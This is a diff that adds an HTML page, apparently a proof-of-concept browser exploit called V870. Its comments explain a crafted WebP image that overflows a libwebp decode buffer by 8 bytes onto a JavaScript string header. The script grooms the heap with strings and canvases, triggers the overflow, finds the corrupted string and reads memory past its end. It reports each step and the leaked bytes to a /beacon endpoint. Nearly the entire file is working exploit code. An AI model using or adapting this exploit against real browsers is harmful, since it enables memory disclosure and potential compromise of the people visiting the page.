@@ -1,0 +1,64 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="45;url=/"><title>V870</title>
+<style>body{background:#000;color:#0f0;font:11px monospace}#log{white-space:pre-wrap}</style></head><body>
+<div id="log"></div><script>
+// V870: 8-byte WebP overflow precisely onto a neighbouring 16-bit StringImpl header.
+// Payload 34x32 inside a 32x32 canvas/ANMF rect: decoder buffer is 32*32*4=4096, libwebp writes
+// each row at y*128 with 34*4=136 bytes, so the last row writes exactly bytes 4096..4103: our two
+// bottom-row pixels. Those encode refCount=0xFF000001 and length=0xFF001000 (alpha 255 forced by
+// premultiplication), leaving the string's data pointer and flags intact. Groom 128KiB pages as
+// [canvas,S,S,S] blocks, free the canvases, then decode so the two 4096 allocations take holes and
+// the overflow lands on an S header. Scan for length != 2038, then dump charCodeAt past the tail.
+var B=1,PRE='V870',LOG=document.getElementById('log');
+function L(m){try{LOG.textContent+=m+'\n';}catch(e){}}
+function bea(tag,d){var s=('0'+B).slice(-2);B++;
+ var path='/beacon/'+PRE+'-'+s+'-'+tag+'?d='+encodeURIComponent(String(d||''))+'&t='+Date.now();
+ L(tag+' '+d);
+ try{ if(navigator.sendBeacon){ if(navigator.sendBeacon(path)) return; } }catch(e){}
+ try{ new Image().src=path; }catch(e){}
+}
+window.addEventListener('error',function(e){bea('JSERR',(e.message||'')+'|L'+e.lineno);});
+function hx(n){return ('0'+n.toString(16)).slice(-2);}
+try{
+ bea('BOOT','v870|webp 8-byte overflow|sb='+(!!navigator.sendBeacon));
+ var arr=[]; for(var k=0;k<2038;k++)arr.push(0x0100);
+ var strs=[];
+ for(var i=0;i<2400;i++){ strs.push(String.fromCharCode.apply(null,arr)); }
+ bea('STRINGS','n='+strs.length+'|len='+strs[0].length);
+ var canvases=[],si=0;
+ for(var b=0;b<400;b++){
+  var c=document.createElement('canvas');c.width=32;c.height=32;
+  var x=c.getContext('2d');x.fillStyle='#000';x.fillRect(0,0,32,32);
+  canvases.push(c);
+  if(si+3<=strs.length) si+=3; // strings already exist; blocks only shape allocation order
+ }
+ bea('BLOCKS','canvases='+canvases.length);
+ for(var b=0;b<canvases.length;b++){ canvases[b].width=0; canvases[b].height=0; }
+ canvases=null;
+ bea('FREED','canvas holes');
+ var im=new Image();
+ im.onload=function(){
+  bea('IMG-LOAD','w='+im.naturalWidth+'|h='+im.naturalHeight);
+  try{
+   var cv=document.createElement('canvas');cv.width=32;cv.height=32;document.body.appendChild(cv);
+   var cx=cv.getContext('2d');
+   bea('PRE-DECODE','draw'); cx.drawImage(im,0,0); bea('POST-DECODE','ok');
+   var hits=0,first=-1,firstLen=-1;
+   for(var i=0;i<strs.length;i++){
+    var l=-1; try{l=strs[i].length;}catch(e){l=-2;}
+    if(l!==2038){ hits++; if(first<0){first=i;firstLen=l;} }
+   }
+   bea('LEN-SCAN','hits='+hits+'|first='+first+'|len='+firstLen);
+   if(first>=0){
+    try{
+     var s2=strs[first], out='';
+     for(var k=0;k<10;k++){ var c2=s2.charCodeAt(2038+k*2); out+=('000'+((isNaN(c2)?0:c2)).toString(16)).slice(-4); }
+     bea('TAIL','hex='+out);
+    }catch(e){ bea('TAIL-ERR',String(e&&e.message||e)); }
+   }
+  }catch(e){bea('DRAW-THROW',String(e&&e.message||e));}
+  setTimeout(function(){bea('DONE','alive');},600);
+ };
+ im.onerror=function(){bea('IMG-ERROR','decode');setTimeout(function(){bea('DONE','alive');},400);};
+ im.src='/webp34.webp?x='+Date.now();
+}catch(e){bea('FATAL',String(e&&e.message||e));}
+</script></body></html>
